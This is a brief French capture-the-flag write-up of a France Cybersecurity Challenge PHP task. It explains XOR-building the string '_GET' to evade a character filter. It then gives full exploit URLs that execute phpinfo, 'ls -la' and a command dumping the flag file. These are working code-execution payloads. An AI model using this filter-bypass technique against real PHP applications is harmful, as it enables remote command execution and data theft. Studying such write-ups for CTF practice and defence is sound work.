# Liprogrammeurs

Merci `https://ctf-wiki.github.io/ctf-wiki/web/php/php/`.

## Détails du payload

La chose importante à voir ici est le xor `^` pour créer la chaine `_GET`.

```php
$_GET['_'] = 'system';
$_GET['__'] = 'ls';

$_ = "`{{{" ^ "?<>/";
${$_}['_']( ${$_}['__'] ); //$_GET['_']( $_GET['__'] )
```

## Payload

Payload pour executer un `phpinfo();`.
```
http://challenges2.france-cybersecurity-challenge.fr:5008/?_=phpinfo&code=$_="`{{{"^"?<>/";${$_}[_]();
```

Payload pour faire un `ls`.
```
http://challenges2.france-cybersecurity-challenge.fr:5008/?_=system&__=ls -la&code=$_="`{{{"^"?<>/";${$_}['_'](${$_}['__']);
```

Payload final
```
http://challenges2.france-cybersecurity-challenge.fr:5008/?_=system&__=cat.flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php|base64&code=$_="`{{{"^"?<>/";${$_}['_'](${$_}['__']);
```
